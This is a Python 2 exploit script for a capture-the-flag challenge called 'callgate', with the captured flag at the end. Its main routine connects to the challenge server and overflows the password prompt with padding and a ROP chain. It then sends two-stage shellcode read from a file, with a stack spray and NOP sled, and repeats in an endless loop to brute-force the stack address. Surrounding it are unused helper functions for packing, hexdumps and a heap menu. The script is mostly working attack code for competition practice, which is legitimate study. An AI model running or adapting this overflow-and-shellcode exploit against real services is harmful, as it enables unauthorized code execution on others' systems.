__author__ = 'HuyNA'
'''
Here in the Wild West, we don't need no kernel code for privilege separation!
A real man can do privsep in userspace!
Download
nc wildwildweb.fluxfingers.net 1413
Note: Read the file "flag". A file that you're allowed to access is "#hello",
protected with the password "passw0rd".
'''

import struct
import socket
import telnetlib
import hexdump
import time
import hashlib
import sys

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0x99)
    return decode_string

def write_entry(f, index, data):
    f.write('2\n')
    f.write(str(index) + '\n')
    f.write(str(len(data)) + '\n')
    f.write(data)
    assert f.readline().strip() == 'OK'

def free_entry(f, index):
    f.write('3\n')
    f.write(str(index) + '\n')
    assert f.readline().strip() == 'OK'

def printf_entry(f, index, delim='END\n'):
    f.write('3\n')
    f.write(str(index) + '\n')
    resp = readuntil(f, delim)[:-len(delim)]
    assert f.readline().strip() == 'OK'
    return resp

def do_printf(f, index, fmt):
    write_entry(f, index, fmt + 'END\n\0')
    return printf_entry(f, index)

def allocate_entry(f, length):
    f.write('1\n')
    f.write(str(length) + '\n')
    index = int(f.readline())
    assert f.readline().strip() == 'OK'
    return index

def strlen_entry(f, index):
    f.write('4\n')
    f.write(str(index) + '\n')
    msg = f.readline().strip()
    assert f.readline().strip() == 'OK'
    return msg

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
'''
nc wildwildweb.fluxfingers.net 1413
Note: Read the file "flag". A file that you're allowed to access is "#hello", protected with the password "passw0rd".
 socat TCP-LISTEN:1413,reuseaddr,fork EXEC:./callgate
'''

def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop
def write_file(file_name, content):
    f = open(file_name,'wb')
    f.write(content)
    f.close()
def read_file(file_name):
    f = open(file_name, 'rb')
    content = ''
    byte = f.read(1)
    while byte != b"":
        content += byte
        byte = f.read(1)
    f.close()
    return content

data = read_file('callgate_shellcode')
signature = 'q'*16
offset_sign = data.find(signature)
shellcode1 = data[0:offset_sign]
shellcode2 = data[offset_sign+len(signature):]

beauty_print(shellcode1)
beauty_print(shellcode2)
def brute_stack():
    #s = socket.create_connection(('grandprix.whitehat.vn', 7007))
    #s = socket.create_connection(('192.168.248.129', 1413))
    s = socket.create_connection(('wildwildweb.fluxfingers.net', 1413))

    #sys.stdin.read(1)

    stack_address = 0xfffdd000
    rop=[
        #0x08048110,
        0x08048146,
        stack_address,
        0,
        stack_address
    ]
    rop = convert_format(rop)

    buff = 'a'*0x74+rop+'\n'
    print recv_until(s,'Please enter a filename: ')
    s.send('#hello\n')
    time.sleep(0.001)
    print recv_until(s,'Please enter password: ')
    s.send(buff)

    s.send(shellcode1+'\n')
    time.sleep(0.01)

    print s.recv(1024)

    rop2 = pi(stack_address+2)*(0x180/4) + '\x90'*0x120 + shellcode2 + '\n'
    s.send(rop2)

    time.sleep(0.01)

    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
    print s.recv(1024)
ii=0
while 1:
    print ii
    ii += 1
    brute_stack()
    time.sleep(0x0001)

'''
flag{just_like_exploiting_crappy_kernels}
'''